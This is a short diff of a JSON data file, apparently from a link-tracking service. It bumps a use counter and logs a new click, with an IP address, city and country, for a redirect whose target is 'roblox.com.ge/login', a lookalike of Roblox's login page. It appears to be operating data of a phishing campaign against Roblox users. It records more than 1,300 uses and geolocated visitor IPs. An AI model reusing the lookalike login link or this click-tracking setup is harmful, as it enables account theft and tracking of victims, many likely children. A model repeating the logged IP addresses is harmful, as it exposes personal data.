@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1357,
+    "useCount": 1358,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11024,6 +11024,14 @@
         "city": "Kissimmee",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777417046656,
+        "ip": "162.141.47.28",
+        "country": "Dominican Republic",
+        "city": "Santo Domingo",
+        "flag": "🇩🇴",
+        "countryCode": "DO"
       }
     ]
   },
